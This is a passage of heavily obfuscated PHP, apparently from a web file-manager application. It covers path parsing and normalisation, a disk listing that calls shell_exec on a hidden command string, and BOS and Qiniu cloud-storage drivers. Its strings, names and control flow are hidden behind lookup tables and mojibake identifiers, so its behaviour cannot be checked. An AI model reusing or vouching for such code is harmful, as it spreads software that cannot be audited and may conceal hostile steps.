"\x7b\144\x72\x69\166\145\x72\175"; public static function typeList() { $ ¹Ú¡£ =& $_SERVER[£ğ°ÖØø]; return array($ ¹Ú¡£[1319] => self::KOD_SOURCE, $ ¹Ú¡£[1320] => self::KOD_USER_RECYCLE, $ ¹Ú¡£[1321] => self::KOD_USER_FAV, $ ¹Ú¡£[1322] => self::KOD_USER_FILE_TAG, $ ¹Ú¡£[1323] => self::KOD_USER_FILE_TYPE, $ ¹Ú¡£[1324] => self::KOD_GROUP_ROOT_SELF, $ ¹Ú¡£[1325] => self::KOD_USER_SHARE, $ ¹Ú¡£[1326] => self::KOD_USER_SHARE_LINK, $ ¹Ú¡£[1327] => self::KOD_USER_SHARE_TO_ME, $ ¹Ú¡£[1328] => self::KOD_SHARE_ITEM, $ ¹Ú¡£[1329] => self::KOD_SHARE_LINK, $ ¹Ú¡£[1330] => self::KOD_SEARCH, $ ¹Ú¡£[1331] => self::KOD_BLOCK, $ ¹Ú¡£[1332] => self::KOD_IO, $ ¹Ú¡£[1333] => self::KOD_USER_RECENT, $ ¹Ú¡£[1334] => self::KOD_USER_DRIVER); } public static function parse($ŠÍ®»«Á) { $¡œÖÜ¢ =& $_SERVER[£ğ°ÖØø]; $ŠÍ®»«Á = self::clear($ŠÍ®»«Á); $ùÃ»¸¬® = array_values(self::typeList()); preg_match($¡œÖÜ¢[1335], $ŠÍ®»«Á, $¿¢ÍÎ—¦); $Ø¶™¸œº = array($¡œÖÜ¢[505] => !1, $¡œÖÜ¢[1336] => !1, $¡œÖÜ¢[502] => !1, $¡œÖÜ¢[87] => $ŠÍ®»«Á, $¡œÖÜ¢[1234] => !1, $¡œÖÜ¢[1233] => $¡œÖÜ¢[12]); if (is_array($¿¢ÍÎ—¦) && count($¿¢ÍÎ—¦) == 5) { $è·İá·Ğ = $¡œÖÜ¢[1337] . $¿¢ÍÎ—¦[2] . $¡œÖÜ¢[403]; if (in_array($è·İá·Ğ, $ùÃ»¸¬®)) { $Ø¶™¸œº[$¡œÖÜ¢[1234]] = $¿¢ÍÎ—¦[1]; $Ø¶™¸œº[$¡œÖÜ¢[33]] = $è·İá·Ğ; $Ø¶™¸œº[$¡œÖÜ¢[1338]] = substr($è·İá·Ğ, 1, -1); $Ø¶™¸œº[$¡œÖÜ¢[484]] = $¿¢ÍÎ—¦[3]; } $Ø¶™¸œº[$¡œÖÜ¢[1233]] = $¿¢ÍÎ—¦[4]; } $èñû‘­Ÿ = array($¡œÖÜ¢[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Ø¶™¸œº[$¡œÖÜ¢[1301]] = in_array($Ø¶™¸œº[$¡œÖÜ¢[33]], $èñû‘­Ÿ); return $Ø¶™¸œº; } public static function isTruePath($Ú¬Ü) { $×ôü  =& $_SERVER[£ğ°ÖØø]; if (substr($Ú¬Ü, 0, 1) != $×ôü [1337]) { return !0; } if (strpos($Ú¬Ü, $×ôü [492]) === 0) { return !0; } if (strpos($Ú¬Ü, $×ôü [1305]) === 0) { return !0; } if (strpos($Ú¬Ü, $×ôü [1339]) === 0) { return !0; } if (strpos($Ú¬Ü, $×ôü [1340]) === 0) { return !0; } if (strpos($Ú¬Ü, $×ôü [1341]) === 0) { return !0; } return !1; } public static function clear($íÓÔÂ›¸) { $Ÿ…İù•­ =& $_SERVER[£ğ°ÖØø]; $íÓÔÂ›¸ = str_replace(array($Ÿ…İù•­[1140], $Ÿ…İù•­[262]), $Ÿ…İù•­[53], $íÓÔÂ›¸); $íÓÔÂ›¸ = str_replace($Ÿ…İù•­[100], $Ÿ…İù•­[8], $íÓÔÂ›¸); $’ÖªŒí = $Ÿ…İù•­[1342]; if (substr($íÓÔÂ›¸, 0, 3) == $Ÿ…İù•­[1343]) { $íÓÔÂ›¸ = substr($íÓÔÂ›¸, 3); } while (strstr($íÓÔÂ›¸, $’ÖªŒí)) { $íÓÔÂ›¸ = str_replace($’ÖªŒí, $Ÿ…İù•­[8], $íÓÔÂ›¸); } $íÓÔÂ›¸ = preg_replace($Ÿ…İù•­[1344], $Ÿ…İù•­[8], $íÓÔÂ›¸); if ($íÓÔÂ›¸ == $Ÿ…İù•­[8]) { return $Ÿ…İù•­[8]; } $íÓÔÂ›¸ = rtrim($íÓÔÂ›¸, $Ÿ…İù•­[8]); return $íÓÔÂ›¸; } public static function pathTrue($£—İè¼Í) { $Ü´Šâ„í =& $_SERVER[£ğ°ÖØø]; if (!$£—İè¼Í) { return $Ü´Šâ„í[12]; } $£—İè¼Í = str_replace($Ü´Šâ„í[601], $Ü´Šâ„í[8], str_replace($Ü´Šâ„í[1345], $Ü´Šâ„í[8], $£—İè¼Í)); $£—İè¼Í = str_replace($Ü´Šâ„í[601], $Ü´Šâ„í[8], str_replace($Ü´Šâ„í[1345], $Ü´Šâ„í[8], $£—İè¼Í)); if (!strstr($£—İè¼Í, $Ü´Šâ„í[1343])) { return $£—İè¼Í; } $…“Î‘¢Å = explode($Ü´Šâ„í[8], $£—İè¼Í); foreach ($…“Î‘¢Å as $ôóä­®¶ => $¼›¹¨ ¥) { if ($¼›¹¨ ¥ !== $Ü´Šâ„í[1346]) { continue; } for ($šç—…‡¯ = $ôóä­®¶; $šç—…‡¯ >= 0; $šç—…‡¯--) { if ($…“Î‘¢Å[$šç—…‡¯] === $Ü´Šâ„í[10] || $…“Î‘¢Å[$šç—…‡¯] === $Ü´Šâ„í[1346] || $…“Î‘¢Å[$šç—…‡¯] === -1) { continue; } if ($…“Î‘¢Å[$šç—…‡¯] === $Ü´Šâ„í[12]) { $…“Î‘¢Å[$ôóä­®¶] = -1; break; } $…“Î‘¢Å[$ôóä­®¶] = -1; $…“Î‘¢Å[$šç—…‡¯] = -1; break; } } $¦ÖàÕûó = array(); foreach ($…“Î‘¢Å as $¼›¹¨ ¥) { if ($¼›¹¨ ¥ !== -1) { $¦ÖàÕûó[] = $¼›¹¨ ¥; } } $Ê¾ğâ¼À = implode($Ü´Šâ„í[8], $¦ÖàÕûó); if (strpos($Ê¾ğâ¼À, $Ü´Šâ„í[1347]) === 0) { $Ê¾ğâ¼À = $Ü´Šâ„í[1343] . substr($Ê¾ğâ¼À, strlen($Ü´Šâ„í[1347])); } return $Ê¾ğâ¼À; } public static function pathUrlClear($ÇˆÅªò) { $÷‹ÕíÁ =& $_SERVER[£ğ°ÖØø]; if (!$ÇˆÅªò) { return $ÇˆÅªò; } $ÇˆÅªò = rawurldecode($ÇˆÅªò); $ÇˆÅªò = str_replace($÷‹ÕíÁ[1345], $÷‹ÕíÁ[8], $ÇˆÅªò); if (strpos($ÇˆÅªò, $÷‹ÕíÁ[76]) > 0) { $ÇˆÅªò = substr($ÇˆÅªò, 0, strpos($ÇˆÅªò, $÷‹ÕíÁ[76])); } if (strpos($ÇˆÅªò, $÷‹ÕíÁ[1348]) > 0) { $ÇˆÅªò = substr($ÇˆÅªò, 0, strpos($ÇˆÅªò, $÷‹ÕíÁ[1348])); } return $ÇˆÅªò; } public static function sourceID($ØÇ§±×¯) { $–º£‹áÈ =& $_SERVER[£ğ°ÖØø]; $Ì»Ã°‘ = self::parse($ØÇ§±×¯); if ($Ì»Ã°‘[$–º£‹áÈ[33]] !== self::KOD_SOURCE) { show_json(LNG($–º£‹áÈ[1349]), !1); } return $Ì»Ã°‘[$–º£‹áÈ[484]]; } public static function make($«†ôŞíİ) { if (!$«†ôŞíİ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($«†ôŞíİ)); } public static function makeShare($Í¡ÒøİÃ, $ÚöÚ—ñÙ) { return self::makePath(self::KOD_SHARE_ITEM, $Í¡ÒøİÃ, $ÚöÚ—ñÙ); } public static function makeFileTypePath($£¹×ç¹–) { return self::makePath(self::KOD_USER_FILE_TYPE, $£¹×ç¹–); } public static function makeFileTagPath($†‹ÇÃœÈ) { return self::makePath(self::KOD_USER_FILE_TAG, $†‹ÇÃœÈ); } public static function makePath($ÇÓ»“ğï, $™‹Æã´ï = '', $÷¹Á“ê’ = '') { $¬¡ß”Ÿœ =& $_SERVER[£ğ°ÖØø]; $¬ óá…ä = substr($ÇÓ»“ğï, 1, -1); $†Î…†î¦ = $¬¡ß”Ÿœ[1350] . $¬ óá…ä . $¬¡ß”Ÿœ[1351] . $™‹Æã´ï . $¬¡ß”Ÿœ[1352]; $†Î…†î¦ = $÷¹Á“ê’ ? $†Î…†î¦ . $÷¹Á“ê’ . $¬¡ß”Ÿœ[8] : $†Î…†î¦; return $†Î…†î¦; } public static function hashPath($àî±Ø, $‚·ª¿…‡ = true) { $àëè¡½† =& $_SERVER[£ğ°ÖØø]; $ŞÉ§¼ = is_array($àî±Ø) ? $àî±Ø : IO::info($àî±Ø); $€£€™÷ß = _get($ŞÉ§¼, $àëè¡½†[1353], $àëè¡½†[12]); if (!$€£€™÷ß && isset($ŞÉ§¼[$àëè¡½†[235]])) { $€£€™÷ß = trim($ŞÉ§¼[$àëè¡½†[235]], $àëè¡½†[121]); } if (!$€£€™÷ß && isset($ŞÉ§¼[$àëè¡½†[193]]) && $ŞÉ§¼[$àëè¡½†[193]]) { $ŞÉ§¼ = IO::info(KodIO::make($ŞÉ§¼[$àëè¡½†[193]])); $€£€™÷ß = _get($ŞÉ§¼, $àëè¡½†[1353], $àëè¡½†[12]); } $öšú°“½ = md5($ŞÉ§¼[$àëè¡½†[87]] . $ŞÉ§¼[$àëè¡½†[79]] . $ŞÉ§¼[$àëè¡½†[88]]); if (!$€£€™÷ß && file_exists($ŞÉ§¼[$àëè¡½†[87]])) { $€£€™÷ß = Cache::get($öšú°“½ . $àëè¡½†[1354]); $€£€™÷ß = !1; if (!$€£€™÷ß) { $€£€™÷ß = IO::hashSimple($ŞÉ§¼[$àëè¡½†[87]]); Cache::set($öšú°“½ . $àëè¡½†[1354], $€£€™÷ß, 3600 * 24 * 30); } } if ($‚·ª¿…‡ && !$€£€™÷ß) { } return $€£€™÷ß ? $€£€™÷ß : $öšú°“½; } public static function hashPathSafe($¯•ş‹çÈ, $û¢â‡­ = true) { $‚¸Ä«Ğê =& $_SERVER[£ğ°ÖØø]; $ÕÓñ³º› = self::hashPath($¯•ş‹çÈ, $û¢â‡­); return md5($ÕÓñ³º› . $‚¸Ä«Ğê[1355] . Model($‚¸Ä«Ğê[834])->get($‚¸Ä«Ğê[835])); } public static function initSystemPath() { $ëÕº®ÀÓ =& $_SERVER[£ğ°ÖØø]; if (defined($ëÕº®ÀÓ[1356])) { return; } define($ëÕº®ÀÓ[1356], self::systemPath($ëÕº®ÀÓ[191])); define($ëÕº®ÀÓ[1357], self::systemPath($ëÕº®ÀÓ[1358])); define($ëÕº®ÀÓ[1359], self::systemPath($ëÕº®ÀÓ[1360])); define($ëÕº®ÀÓ[1361], self::systemPath($ëÕº®ÀÓ[1362])); IOHistory::bindEvent(); } public static function systemPath($µœ”Ñ†Î) { $¨Ö¢ííş =& $_SERVER[£ğ°ÖØø]; $‘ÁÎ˜û¼ = $¨Ö¢ííş[1363] . ucfirst($µœ”Ñ†Î); $’í¢®‚• = Model($¨Ö¢ííş[834])->get($‘ÁÎ˜û¼); if ($’í¢®‚•) { return $’í¢®‚•; } if ($µœ”Ñ†Î == $¨Ö¢ííş[191]) { $’í¢®‚• = self::make(Model($¨Ö¢ííş[888])->systemRootPathAdd($¨Ö¢ííş[614])); } else { $’í¢®‚• = self::systemPath($¨Ö¢ííş[191]); $…¶ã´ú• = self::sourceID($’í¢®‚•); $’í¢®‚• = self::make(Model($¨Ö¢ííş[888])->mkdir($…¶ã´ú•, $µœ”Ñ†Î)); } Model($¨Ö¢ííş[834])->set($‘ÁÎ˜û¼, $’í¢®‚•); return $’í¢®‚•; } public static function systemFolder($ÏõñëÑ”) { $×ÑŞ÷ñç = IO_PATH_SYSTEM_SOURCE . $ÏõñëÑ”; $Ç“Éƒ€Ò = Cache::get($×ÑŞ÷ñç); if (!$Ç“Éƒ€Ò) { $ùµ¨Ù×  = IO::infoFullSimple($×ÑŞ÷ñç); if (!$ùµ¨Ù× ) { $Ç“Éƒ€Ò = IO::mkdir($×ÑŞ÷ñç, REPEAT_SKIP); } else { $Ç“Éƒ€Ò = $ùµ¨Ù× [$_SERVER[£ğ°ÖØø][87]]; } Cache::set($×ÑŞ÷ñç, $Ç“Éƒ€Ò, 3600 * 10); } return $Ç“Éƒ€Ò; } public static function defaultDriver() { return Model($_SERVER[£ğ°ÖØø][831])->defaultDriver(); } public static function defaultIO() { $°»ˆ…ë =& $_SERVER[£ğ°ÖØø]; $ŞÔ—ë¹À = self::defaultDriver(); return $°»ˆ…ë[1364] . $ŞÔ—ë¹À[$°»ˆ…ë[484]] . $°»ˆ…ë[1352]; } public static function defaultDriverInit() { static $ÔÜ¨Ü£ = false; if ($ÔÜ¨Ü£) { return $ÔÜ¨Ü£; } $ÔÜ¨Ü£ = IO::init(self::defaultIO()); return $ÔÜ¨Ü£; } public static function fileTypeList() { $úÇä‹‘’ =& $_SERVER[£ğ°ÖØø]; $÷ÈıÛÛŠ = $GLOBALS[$úÇä‹‘’[6]][$úÇä‹‘’[1365]]; foreach ($÷ÈıÛÛŠ as $®æØœœ• => $±ÒÎæ‡Ò) { $¤ßâë‡ı = $úÇä‹‘’[1366] . $®æØœœ•; $âéŸ—¶´ = LNG($¤ßâë‡ı); if ($¤ßâë‡ı != $âéŸ—¶´) { $÷ÈıÛÛŠ[$®æØœœ•][$úÇä‹‘’[32]] = $âéŸ—¶´; } } return $÷ÈıÛÛŠ; } public static function diskList($â×à ü˜ = true) { $Ü¡²ÃÛü = $_SERVER[£ğ°ÖØø][1367]; if ($â×à ü˜) { $ÚĞÁÙì  = Cache::get($Ü¡²ÃÛü); if (is_array($ÚĞÁÙì )) { return $ÚĞÁÙì ; } } $ÚĞÁÙì  = self::diskListGet(); Cache::set($Ü¡²ÃÛü, $ÚĞÁÙì , 60); return $ÚĞÁÙì ; } public static function diskListGet() { $ôóÆŒ’ı =& $_SERVER[£ğ°ÖØø]; $ÅÀğù¸® = array(); if ($GLOBALS[$ôóÆŒ’ı[6]][$ôóÆŒ’ı[1368]] == $ôóÆŒ’ı[1369]) { $·Óö‚¬ = $ôóÆŒ’ı[1370]; for ($æûæ…µ = 0; $æûæ…µ < strlen($·Óö‚¬); $æûæ…µ++) { $ø‚ê­„È = $·Óö‚¬[$æûæ…µ] . $ôóÆŒ’ı[1371]; if (file_exists($ø‚ê­„È)) { $ÅÀğù¸®[] = $ø‚ê­„È; } } return $ÅÀğù¸®; } if (!function_exists($ôóÆŒ’ı[101])) { $ÅÀğù¸®[] = $ôóÆŒ’ı[899]; return $ÅÀğù¸®; } $€’¶€–î = explode($ôóÆŒ’ı[262], shell_exec($ôóÆŒ’ı[1372])); array_shift($€’¶€–î); array_pop($€’¶€–î); $‰µ‘”–² = array($ôóÆŒ’ı[1373], $ôóÆŒ’ı[1374], $ôóÆŒ’ı[1375], $ôóÆŒ’ı[1376], $ôóÆŒ’ı[1377], $ôóÆŒ’ı[1378], $ôóÆŒ’ı[1379], $ôóÆŒ’ı[1380]); foreach ($€’¶€–î as $·‚ı«Ë“) { $®£Ü£‡ = preg_split($ôóÆŒ’ı[1381], $·‚ı«Ë“); $ø‚ê­„È = $®£Ü£‡[count($®£Ü£‡) - 1]; if (!strstr($®£Ü£‡[0], $ôóÆŒ’ı[1382]) || !$ø‚ê­„È) { continue; } $£úô¬ß• = rtrim($ø‚ê­„È, $ôóÆŒ’ı[8]) . $ôóÆŒ’ı[8]; if (in_array($£úô¬ß•, $‰µ‘”–²)) { continue; } $ÅÀğù¸®[] = $£úô¬ß•; } return $ÅÀğù¸®; } public static function isSameDisk($‡ËŒ•Òä, $¤ÙÔŞˆØ) { $íëÛÆº½ =& $_SERVER[£ğ°ÖØø]; if ($GLOBALS[$íëÛÆº½[6]][$íëÛÆº½[1368]] == $íëÛÆº½[1369]) { return strtolower(substr($‡ËŒ•Òä, 0, 1)) == strtolower(substr($¤ÙÔŞˆØ, 0, 1)); } $Çüê£ÒÄ = self::diskList(); $Ê×‰®ô = !1; $îµ‚Å‰é = !1; sort($Çüê£ÒÄ); $Çüê£ÒÄ = array_reverse($Çüê£ÒÄ); $‡ËŒ•Òä = rtrim($‡ËŒ•Òä, $íëÛÆº½[8]) . $íëÛÆº½[8]; $¤ÙÔŞˆØ = rtrim($¤ÙÔŞˆØ, $íëÛÆº½[8]) . $íëÛÆº½[8]; foreach ($Çüê£ÒÄ as $¢şÆæ™ß) { $ï¯•ùŒ = strlen($¢şÆæ™ß); if (!$Ê×‰®ô && substr($‡ËŒ•Òä, 0, $ï¯•ùŒ) == $¢şÆæ™ß) { $Ê×‰®ô = $¢şÆæ™ß; } if (!$îµ‚Å‰é && substr($¤ÙÔŞˆØ, 0, $ï¯•ùŒ) == $¢şÆæ™ß) { $îµ‚Å‰é = $¢şÆæ™ß; } if ($Ê×‰®ô && $îµ‚Å‰é) { break; } } return $Ê×‰®ô === $îµ‚Å‰é; } public static function transferType($êÉ«Çı, $ş‹„ªæ) { $Š¤ÃŒ© =& $_SERVER[£ğ°ÖØø]; $»šï¿Òù = self::driverType($êÉ«Çı); $Ùœ¬Şë = self::driverType($ş‹„ªæ); if ($»šï¿Òù[$Š¤ÃŒ©[33]] == $Ùœ¬Şë[$Š¤ÃŒ©[33]] && $»šï¿Òù[$Š¤ÃŒ©[1383]] == $Ùœ¬Şë[$Š¤ÃŒ©[1383]]) { return $Š¤ÃŒ©[1384]; } if ($»šï¿Òù[$Š¤ÃŒ©[33]] == $Š¤ÃŒ©[932] && $Ùœ¬Şë[$Š¤ÃŒ©[33]] == $Š¤ÃŒ©[109]) { return $Š¤ÃŒ©[1262]; } if ($»šï¿Òù[$Š¤ÃŒ©[33]] == $Š¤ÃŒ©[109] && $Ùœ¬Şë[$Š¤ÃŒ©[33]] == $Š¤ÃŒ©[932]) { return $Š¤ÃŒ©[110]; } return $Š¤ÃŒ©[1385]; } public static function driverType($şÙ˜Èø¤) { $ì…’«Ë =& $_SERVER[£ğ°ÖØø]; $Ü¶ƒÈÊ = str_replace($ì…’«Ë[1386], $ì…’«Ë[12], strtolower($şÙ˜Èø¤->getType())); if ($Ü¶ƒÈÊ == $ì…’«Ë[821] || $Ü¶ƒÈÊ == $ì…’«Ë[1387] || $Ü¶ƒÈÊ == $ì…’«Ë[1388]) { $şÙ˜Èø¤ = self::defaultDriverInit(); } else { if ($Ü¶ƒÈÊ == $ì…’«Ë[1272] || $Ü¶ƒÈÊ == $ì…’«Ë[1389]) { $şÙ˜Èø¤ = IO::init($şÙ˜Èø¤->pathParse[$ì…’«Ë[1215]]); } } $ºÜŠÉæ€ = $şÙ˜Èø¤->path; $Ü¶ƒÈÊ = str_replace($ì…’«Ë[1386], $ì…’«Ë[12], strtolower($şÙ˜Èø¤->getType())); if ($Ü¶ƒÈÊ == $ì…’«Ë[109]) { return array($ì…’«Ë[33] => $ì…’«Ë[109], $ì…’«Ë[1383] => $ì…’«Ë[12], $ì…’«Ë[87] => $ºÜŠÉæ€, $ì…’«Ë[98] => $şÙ˜Èø¤); } return array($ì…’«Ë[33] => $ì…’«Ë[932], $ì…’«Ë[1383] => $şÙ˜Èø¤->pathDriver, $ì…’«Ë[87] => $ºÜŠÉæ€, $ì…’«Ë[98] => $şÙ˜Èø¤); } public static function pathDriverType($±Ë§µ‚) { return $±Ë§µ‚ ? self::driverType(IO::init($±Ë§µ‚)) : !1; } public static function pathDriverLocal($š„À¿–¥) { $æ¡¥¿²¬ =& $_SERVER[£ğ°ÖØø]; $Ö“á½¥ = $š„À¿–¥ ? self::driverType(IO::init($š„À¿–¥)) : !1; return strtolower($Ö“á½¥[$æ¡¥¿²¬[33]]) == $æ¡¥¿²¬[109] ? !0 : !1; } public static function allowCover($ì§Ë§ÉÌ, $™˜ÄÕ£‰ = true) { $•Ì€íà› =& $_SERVER[£ğ°ÖØø]; if (is_string($ì§Ë§ÉÌ)) { $ì§Ë§ÉÌ = IO::info($ì§Ë§ÉÌ); } if (!$ì§Ë§ÉÌ || $ì§Ë§ÉÌ[$•Ì€íà›[33]] == $•Ì€íà›[78] || $ì§Ë§ÉÌ[$•Ì€íà›[79]] <= 100) { return !1; } if (isset($ì§Ë§ÉÌ[$•Ì€íà›[1390]]) || !$ì§Ë§ÉÌ[$•Ì€íà›[87]]) { return !1; } if (isset($ì§Ë§ÉÌ[$•Ì€íà›[232]]) && !$ì§Ë§ÉÌ[$•Ì€íà›[232]]) { return !1; } static $šºéÁ«‚ = false; if (!$šºéÁ«‚ || !$™˜ÄÕ£‰) { $êò³üš = self::driverType(IO::init($ì§Ë§ÉÌ[$•Ì€íà›[87]])); $ÀÖÑÄÆ¾ = $êò³üš[$•Ì€íà›[98]]; $šºéÁ«‚ = $•Ì€íà›[196]; if (strtolower($êò³üš[$•Ì€íà›[33]]) == $•Ì€íà›[109]) { $šºéÁ«‚ = $•Ì€íà›[1391]; } if ($êò³üš[$•Ì€íà›[98]] && is_array($êò³üš[$•Ì€íà›[98]]->config)) { $œ±™¿¯³ = $êò³üš[$•Ì€íà›[98]]->config; if (isset($œ±™¿¯³[$•Ì€íà›[1392]]) && $œ±™¿¯³[$•Ì€íà›[1392]]) { $šºéÁ«‚ = $•Ì€íà›[1391]; } } $ÆıÎËï¡ = KodIO::defaultDriver(); if (strtolower($ÆıÎËï¡[$•Ì€íà›[33]]) == $•Ì€íà›[109] && is_array($ÆıÎËï¡[$•Ì€íà›[6]])) { $şˆÎÚÜ‘ = $›Íç÷è‘[$•Ì€íà›[6]][$•Ì€íà›[1245]]; if (substr($şˆÎÚÜ‘, 0, 2) == $•Ì€íà›[1393]) { $şˆÎÚÜ‘ = str_replace($•Ì€íà›[1393], BASIC_PATH, $şˆÎÚÜ‘); } $şˆÎÚÜ‘ = str_replace($•Ì€íà›[601], $•Ì€íà›[8], $şˆÎÚÜ‘); if (substr($ì§Ë§ÉÌ[$•Ì€íà›[87]], 0, strlen($şˆÎÚÜ‘)) == $şˆÎÚÜ‘) { $šºéÁ«‚ = $•Ì€íà›[196]; } } } return $šºéÁ«‚ == $•Ì€íà›[1391] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($†Òö°½«) { parent::__construct($†Òö°½«); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($¤‘ƒ‰º‚) { $ŞŸé–òé =& $_SERVER[£ğ°ÖØø]; if (substr($¤‘ƒ‰º‚, 0, 7) == $ŞŸé–òé[313]) { $¤‘ƒ‰º‚ = $ŞŸé–òé[314] . substr($¤‘ƒ‰º‚, 7); } header($ŞŸé–òé[175] . $¤‘ƒ‰º‚); die; } } goto f¨ãù£á; a¨æ¹½âäÕ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($¿ÈÀµ€¡) { parent::__construct(); require_once SDK_DIR . $_SERVER[£ğ°ÖØø][1509]; $this->_init($¿ÈÀµ€¡); } public function _init($©Œ‹ä–Ê) { $ÑÇÚÄç =& $_SERVER[£ğ°ÖØø]; $this->config = $©Œ‹ä–Ê; foreach ($©Œ‹ä–Ê as $Í´ÁöÈù => $ÔŒƒî®) { if (isset($this->{$Í´ÁöÈù})) { $this->{$Í´ÁöÈù} = $ÔŒƒî®; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÑÇÚÄç[1510] . LNG($ÑÇÚÄç[1445])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($÷Äá¹Â¡, $€‘ì”İµ = '', $À×ÖÁæ¡ = REPEAT_RENAME) { if ($this->setContent($÷Äá¹Â¡, $€‘ì”İµ)) { return $this->getPathOuter($÷Äá¹Â¡); } return !1; } public function mkdir($èÎ˜Â²À, $ÊêÇ¿’… = REPEAT_SKIP) { $‚÷ş™…† =& $_SERVER[£ğ°ÖØø]; $¨ëÎğĞ¥ = trim($èÎ˜Â²À, $‚÷ş™…†[8]); if ($this->_isFolder($¨ëÎğĞ¥)) { return $this->getPathOuter($¨ëÎğĞ¥); } $èÎ˜Â²À = $¨ëÎğĞ¥ . $‚÷ş™…†[8]; $Ì¢ñÏÂÎ = get_path_this($¨ëÎğĞ¥); $®¹»Ëæ˜ = $èÎ˜Â²À . $Ì¢ñÏÂÎ; if (!$this->mkfile($®¹»Ëæ˜)) { return !1; } if (!$this->moveFile($®¹»Ëæ˜, $èÎ˜Â²À)) { $this->delFile($®¹»Ëæ˜); return !1; } return $this->getPathOuter($¨ëÎğĞ¥); } public function copyFile($Ô­øÎ§, $À™öš®Ò) { $ş‡íú„Ô = $this->bucketManager->copy($this->bucket, $Ô­øÎ§, $this->bucket, $À™öš®Ò, !0); return $ş‡íú„Ô ? !1 : $this->getPathOuter($À™öš®Ò); } public function moveFile($Å†ÒüÎ¥, $ì·‚”‚Ò) { $Ÿé»£Æ = $this->bucketManager->move($this->bucket, $Å†ÒüÎ¥, $this->bucket, $ì·‚”‚Ò, !0); return $Ÿé»£Æ ? !1 : $this->getPathOuter($ì·‚”‚Ò); } public function delFile($ÔÙî¸¦) { if (!$this->exist($ÔÙî¸¦)) { return !0; } $”ØÎáåû = $this->bucketManager->delete($this->bucket, $ÔÙî¸¦); return $”ØÎáåû ? !1 : !0; } public function delFolder($Œ¯¥®–) { $ÌÛ×ˆî™ =& $_SERVER[£ğ°ÖØø]; if (!$this->exist($Œ¯¥®–)) { return !0; } $this->listItemCache = !1; $ş»Æ·­ = $this->fileList($Œ¯¥®–); $this->listItemCache = !0; $±†Ç“¶« = trim($Œ¯¥®–, $ÌÛ×ˆî™[8]) . $ÌÛ×ˆî™[8]; if (!empty($Œ¯¥®–) && $Œ¯¥®– !== $ÌÛ×ˆî™[228] && !in_array($±†Ç“¶«, $ş»Æ·­[$ÌÛ×ˆî™[85]])) { $ş»Æ·­[$ÌÛ×ˆî™[85]][] = $±†Ç“¶«; } $¤šŸÉËÂ = $this->delByBatch($ş»Æ·­[$ÌÛ×ˆî™[86]]); if (!$¤šŸÉËÂ) { return !1; } $¤šŸÉËÂ = $this->delByBatch($ş»Æ·­[$ÌÛ×ˆî™[85]]); if (!$¤šŸÉËÂ) { return !1; } return $this->delFile($±†Ç“¶«); } private function delByBatch($“Î‘²«…) { foreach (array_chunk($“Î‘²«…, 1000) as $¸ñƒÉ´) { $ÑòĞ©ù³ = $this->bucketManager->buildBatchDelete($this->bucket, $¸ñƒÉ´); list($òºä£®Ù, $ÀãõÀ…¡) = $this->bucketManager->batch($ÑòĞ©ù³); if ($ÀãõÀ…¡) { return !1; } } return !0; } public function rename($çš£ä»Ü, $¶›‰ò´Â) { return $this->renameObject($çš£ä»Ü, $¶›‰ò´Â); } public function fileInfo($ò·ô°¦, $âššÛÀ” = false, $„ÌúŠö = array()) { $Û»Ï–Úİ =& $_SERVER[£ğ°ÖØø]; $Ë ãüŒ„ = array($Û»Ï–Úİ[32] => $this->pathThis($ò·ô°¦), $Û»Ï–Úİ[87] => $this->getPathOuter($Û»Ï–Úİ[8] . $ò·ô°¦), $Û»Ï–Úİ[33] => $Û»Ï–Úİ[230], $Û»Ï–Úİ[79] => isset($„ÌúŠö[$Û»Ï–Úİ[1511]]) ? $„ÌúŠö[$Û»Ï–Úİ[1511]] : 0, $Û»Ï–Úİ[169] => $this->ext($ò·ô°¦)); if ($âššÛÀ”) { return $Ë ãüŒ„; } $Ë ãüŒ„[$Û»Ï–Úİ[231]] = $Ë ãüŒ„[$Û»Ï–Úİ[88]] = 0; $Ë ãüŒ„[$Û»Ï–Úİ[232]] = $Ë ãüŒ„[$Û»Ï–Úİ[233]] = !0; if (empty($„ÌúŠö)) { $„ÌúŠö = $this->objectMeta($ò·ô°¦); if (!$„ÌúŠö) { return $Ë ãüŒ„; } } if (isset($„ÌúŠö[$Û»Ï–Úİ[234]]) && $„ÌúŠö[$Û»Ï–Úİ[234]]) { $Ë ãüŒ„[$Û»Ï–Úİ[235]] = $„ÌúŠö[$Û»Ï–Úİ[234]]; } if (isset($„ÌúŠö[$Û»Ï–Úİ[245]]) && $„ÌúŠö[$Û»Ï–Úİ[245]]) { $Ë ãüŒ„[$Û»Ï–Úİ[235]] = $„ÌúŠö[$Û»Ï–Úİ[245]]; } if (isset($„ÌúŠö[$Û»Ï–Úİ[1512]])) { $Ë ãüŒ„[$Û»Ï–Úİ[88]] = substr($„ÌúŠö[$Û»Ï–Úİ[1512]] . $Û»Ï–Úİ[12], 0, 10); } if (isset($„ÌúŠö[$Û»Ï–Úİ[1511]])) { $Ë ãüŒ„[$Û»Ï–Úİ[79]] = $„ÌúŠö[$Û»Ï–Úİ[1511]]; } return $Ë ãüŒ„; } public function folderInfo($£à÷¾™Ô, $‹†€¬º = false) { $Õ¹¯½ğ =& $_SERVER[£ğ°ÖØø]; $Œ‡¹êò = array($Õ¹¯½ğ[32] => $this->pathThis($£à÷¾™Ô), $Õ¹¯½ğ[87] => $this->getPathOuter($Õ¹¯½ğ[8] . $£à÷¾™Ô), $Õ¹¯½ğ[33] => $Õ¹¯½ğ[78]); if ($‹†€¬º) { return $Œ‡¹êò; } $Œ‡¹êò[$Õ¹¯½ğ[231]] = $Œ‡¹êò[$Õ¹¯½ğ[88]] = 0; 